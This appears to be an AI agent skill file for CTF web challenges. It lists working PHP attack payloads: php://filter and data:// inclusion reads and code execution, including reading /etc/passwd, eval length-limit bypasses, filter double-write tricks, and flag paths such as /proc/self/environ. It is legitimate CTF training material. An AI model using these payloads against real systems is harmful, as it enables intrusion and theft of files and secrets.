---
name: ctf-web
description: CTF Web attack knowledge base — PHP weak-comparison bypass, command injection space bypass, eval echo tricks, SSTI injection chains, deserialization exploit chains, PHP code-audit checklist, common flag locations
---

# CTF Web Attack Knowledge Base

A hands-on knowledge base for CTF Web challenges. Provides **concrete bypass values, payload templates, and code-audit checklists** — not general pentest methodology.

**Difference from `web-security-advanced`**:
- `web-security-advanced` → Pentest methodology (how to systematically test a web app)
- `ctf-web` → CTF hands-on knowledge (which MD5 values to use for weak comparison, how to bypass spaces, how to get eval output)

## Core Principles

1. **Exact values over methodology** — provide bypass values and payloads you can use directly, not "you can try" suggestions
2. **Tool verification** — all payloads must be actually sent and verified with `fetch` or `python_execute` tools; never guess results
3. **Path selection** — when multiple exploit paths exist, prefer the one with the fewest filters and simplest approach
4. **Record failures** — log a failed payload immediately and don't retry it

## First-Pass Workflow (Standard CTF Web Flow)

1. Visit the target URL; view page source, HTTP headers, Cookies
2. **If source uses `highlight_file` → extract clean source with python_execute + strip_tags** (fetch output may be misread)
3. Check robots.txt, .git/, .svn/, backup files (index.php.bak, www.zip, etc.)
4. Directory scan (common: /flag, /admin, /login, /upload, /api)
5. If source available → enter code audit mode (see `php-code-audit-checklist.md`)
6. If no source → actively probe injection points, upload endpoints, file inclusion

## Scenario Routing

| Scenario | Reference | Core Content |
|----------|-----------|--------------|
| ⭐ PHP pseudo-protocols to read files (try first when file inclusion/filename parameter found) | see "PHP Pseudo-Protocol Quick Reference" below | `php://filter` reads source/flag directly |
| Source code extraction | `source-code-extraction.md` | strip_tags extraction, php://filter, .phps, backup files, integrity check |
| PHP weak comparison / type juggling bypass | `php-bypass-cheatsheet.md` | Full list of 0e-prefix MD5 values, array bypass, extract() overwrite |
| ⭐ MD5 weak comparison collision (`md5(a)==md5(b)` weak compare) | `php-bypass-cheatsheet.md` | ⚠️ Digits only after 0e! Use pre-verified values like `QNKCDZO`+`240610708` |
| ⭐ preg_replace/str_replace double-write bypass | see "Double-Write Bypass Quick Reference" below | `NSSNSSCTFCTF` → after replacement = `NSSCTF` |
| Command injection space bypass | `command-injection-bypass.md` | ${IFS}/$IFS$9/</%09/%0a full table |
| eval/RCE tricks | `eval-and-rce-techniques.md` | system/exec/passthru differences, highlight_file output order, blind exfiltration |
| SSTI injection chains | `ssti-injection-chains.md` | Jinja2/Twig/ERB/Mako injection chain quick reference |
| Deserialization exploit chains | `deserialization-playbook.md` | PHP/Java/Python deserialization, SoapClient CRLF |
| File upload → RCE | `file-upload-to-rce.md` | .htaccess bypass, log poisoning, polyglot webshell |
| CTF quick reference | `web-ctf-quick-reference.md` | Flag locations, common chain shapes, response header hints |
| PHP code audit | `php-code-audit-checklist.md` | Input entry → filter → dangerous function → output analysis |

## ⭐ PHP Pseudo-Protocol Quick Reference (Try first when file inclusion/filename param found)

**Trigger conditions**: When the challenge has any of the following characteristics, **try php://filter before anything else**:

| Trigger | Example |
|---------|---------|
| Parameter accepts filename/path | `?file=xxx` / `?page=xxx` / `?num=xxx` / `?path=xxx` |
| `include` / `require` / `include_once` | these functions in source |
| Page shows source code | `highlight_file()` / `show_source()` |
| Challenge asks to "read file" or "find flag" | explicitly reads server files |

### Pseudo-Protocol Payload Quick Reference

```
# 1. Read PHP source (base64-encoded, prevents PHP execution)
?file=php://filter/read=convert.base64-encode/resource=flag.php
?file=php://filter/read=convert.base64-encode/resource=index.php

# 2. Read PHP source (rot13 encoding)
?file=php://filter/read=string.rot13/resource=flag.php

# 3. Read file directly (non-PHP files like .txt/.log)
?file=php://filter/resource=/etc/passwd

# 4. Code execution
?file=php://input  (place PHP code in POST body)
?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==
```

### ⚠️ Key Reminders

1. **Don't jump to "bypass" — first ask if you can "read directly"** — many challenges accept a filename parameter where you can read flag.php directly with a pseudo-protocol, no filter bypass needed
2. **`convert.base64-encode` is the universal reader** — PHP files execute when included, but base64-encoded they don't, so you get the source
3. **Parameter name isn't always `file`** — could be `page`, `num`, `path`, `template`, etc. — any parameter treated as a file path/name may work
4. **After getting base64, use `crypto_decode` tool to decode** — don't mentally reconstruct the result yourself

## Common Flag Location Quick Reference

**⚠️ After getting RCE, test flag locations in this priority order — don't stop at flag.php in the current directory:**

```
Priority 1 (most common): cat /flag
Priority 2:               cat /flag.txt
Priority 3:               ls /  → find the flag filename in root
Priority 4:               cat /var/www/html/flag.php
Priority 5:               cat /home/ctf/flag
Priority 6:               cat /root/flag
Other locations:          /environment, /proc/self/environ, env command
```

**Note**: `ls` lists the current directory (`/var/www/html/`) by default; root-level `/flag` requires `ls /` to see.

## Common CTF Web Challenge Type Quick Identification

| Challenge characteristic | Likely focus | Recommended reference |
|--------------------------|--------------|----------------------|
| Parameter accepts filename/path | ⭐ **Try php://filter to read flag first** | See "PHP Pseudo-Protocol Quick Reference" above |
| Page only shows login form | SQL injection / weak password / race condition | php-bypass-cheatsheet.md |
| Page shows code | Code audit | php-code-audit-checklist.md |
| eval/system in source | RCE + space/keyword bypass | eval-and-rce-techniques.md + command-injection-bypass.md |
| eval + length limit | RCE + `$_GET` chained param to bypass length | see "RCE + Length Limit Bypass" below |
| File upload feature | Extension bypass / MIME bypass | file-upload-to-rce.md |
| Page uses template rendering | SSTI | ssti-injection-chains.md |
| Serialize/deserialize | PHP/Java deserialization | deserialization-playbook.md |
| WAF/filter hints | Regex bypass / encoding bypass | php-bypass-cheatsheet.md + command-injection-bypass.md |

## RCE + Length Limit Bypass (Preferred Strategy)

When `eval()` has a `strlen()` length limit (e.g. ≤ 18 chars), **use `$_GET` chained parameter passing**:

### Standard Solution

```
?get=eval($_GET['A']);&A=system('cat /flag');
```

**How it works**:
- `eval($_GET['A'])` = 16 characters, passes the length limit
- The actual command is in the second GET parameter `A`, which has no length limit
- PHP first executes `eval()`, treating `$_GET['A']`'s value as PHP code

### Variants

| Length limit | Payload | Char count |
|-------------|---------|------------|
| ≤ 18 | `eval($_GET['A']);` | 16 |
| ≤ 18 | `eval($_GET[0]);` | 14 |
| ≤ 16 | `eval($_GET[A]);` | 13 (no quotes; PHP auto-converts to string) |
| ≤ 12 | `$_GET[0]();` | 10 (pass function name like `system` in A, command in another param) |

### Notes
- Don't waste time shortening the payload (e.g. using `?>` to exit PHP mode, backticks, etc.) — **chained params is the universal solution**
- Dual GET param URL format: `?get=eval($_GET['A']);&A=system('cat /flag');`
- Use `python_execute` tool to build the request, not the fetch tool (fetch may not support multiple params)

## ⭐ preg_replace / str_replace Double-Write Bypass Quick Reference

**Trigger condition**: Source has `preg_replace('/X/', '', $str)` or `str_replace('X', '', $str)`, and the replaced result must equal `"X"` exactly

### Core Principle
Embed the complete keyword inside itself; after replacement removes the inner copy, the outer pieces concatenate to form the original word.

### Universal Construction Formula
```
Input = keyword_first_half + keyword + keyword_second_half
```

### Common Filter Word Quick Table

| Filtered keyword | Double-write input | Replacement process | Result |
|-----------------|--------------------|---------------------|--------|
| NSSCTF | `NSSNSSCTFCTF` | remove inner NSSCTF → NSS+CTF | `NSSCTF` ✅ |
| flag | `flflagag` | remove inner flag → fl+ag | `flag` ✅ |
| cat | `cacatt` | remove inner cat → ca+t | `cat` ✅ |
| system | `syssystemtem` | remove inner system → sys+tem | `system` ✅ |
| hack | `hahackck` | remove inner hack → ha+ck | `hack` ✅ |
| cmd | `cmcmdd` | remove inner cmd → cm+d | `cmd` ✅ |
| exec | `exexecec` | remove inner exec → ex+ec | `exec` ✅ |

### ⚠️ Key Notes
1. **Case bypass doesn't work** — replacement returns `NssCTF`, which is not equal to `"NSSCTF"`, strict comparison fails
2. **Identification signal** — see `preg_replace('/X/', '', $str)` + `$str === "X"` → apply double-write immediately
3. **Same applies to str_replace** — `str_replace` is also a single-pass replacement, double-write works the same
4. **Multiple replacements** — if the code calls `preg_replace` multiple times, you may need triple/quadruple-write, but CTF challenges usually only need double-write
